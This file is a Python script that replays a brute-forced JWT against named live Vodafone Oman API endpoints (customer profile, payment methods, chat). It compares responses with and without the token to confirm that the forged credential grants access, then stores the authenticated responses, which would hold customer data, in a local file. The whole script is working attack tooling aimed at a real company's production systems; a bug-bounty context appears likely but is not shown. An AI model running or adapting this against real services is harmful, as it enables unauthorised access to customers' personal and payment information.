#!/usr/bin/env python3
"""
verify_jwt.py — prove the brute-forced JWT actually works against the real
Vodafone Oman backends (401 without token -> 200/accepted with token).

Usage:
  python3 verify_jwt.py /path/to/bf_SUCCESS.json
  python3 verify_jwt.py <raw-jwt-string>

Writes verify_result.json next to the input file (when given a file).
python3 stdlib only (3.8+).
"""
import base64, json, sys, time, uuid
import urllib.error, urllib.request

UA = ("Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Version/4.0 Chrome/120.0 Mobile Safari/537.36 h1.recon")

# (base, path, method, label)
ENDPOINTS = [
    ("https://vfo02.vodafone.om", "/api/public/profile/v1",
     "GET", "profile"),
    ("https://vfo02.vodafone.om", "/api/public/profile/v1/paymentMethods",
     "POST", "paymentMethods"),
    ("https://vfo03.vodafone.om", "/chat/customer/v1/agents/availability",
     "GET", "chat_agents"),
]


def req(base, path, method, bearer=None):
    h = {"User-Agent": UA, "Accept": "application/json",
         "X-Application-ID": "MVA_ANDROID", "X-Request-ID": str(uuid.uuid4()),
         "X-Correlation-ID": str(uuid.uuid4()),
         "Zen-Application": "MVA", "Zen-OS": "android", "Zen-AppVersion": "5.2.2"}
    if bearer:
        h["Authorization"] = "Bearer " + bearer
    data = None
    if method == "POST":
        h["Content-Type"] = "application/json"
        data = b"{}"
    r = urllib.request.Request(base + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=40) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def claims_of(jwt):
    seg = jwt.split(".")[1] + "=" * (-len(jwt.split(".")[1]) % 4)
    return json.loads(base64.urlsafe_b64decode(seg))


def main():
    if len(sys.argv) < 2:
        sys.exit("usage: verify_jwt.py <bf_SUCCESS.json | raw-jwt>")
    arg = sys.argv[1].strip()
    src = None
    jwt = arg
    if not jwt.startswith("eyJ"):
        j = json.load(open(arg))
        jwt = j["jwt"]
        src = arg
    cl = claims_of(jwt)
    print("=== JWT claims ===")
    print(json.dumps(cl, indent=2))
    out = {"ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
           "claims": cl, "endpoints": []}
    for base, path, method, label in ENDPOINTS:
        st0, b0 = req(base, path, method, None)
        time.sleep(2)
        st1, b1 = req(base, path, method, jwt)
        print("\n=== %s %s %s%s ===" % (label, method, base, path))
        print("  WITHOUT Bearer: HTTP %s  %s" % (st0, b0[:200]))
        print("  WITH Bearer:    HTTP %s  %s" % (st1, b1[:400]))
        out["endpoints"].append({
            "label": label, "method": method, "base": base, "path": path,
            "no_token": {"http": st0, "raw": b0[:500]},
            "with_token": {"http": st1, "raw": b1[:4000]},
        })
    if src:
        out_path = src.rsplit("/", 1)[0] + "/verify_result.json"
        with open(out_path, "w") as f:
            json.dump(out, f, indent=2)
        print("\nwrote " + out_path)
    else:
        print("\n" + json.dumps(out, indent=2))


if __name__ == "__main__":
    main()
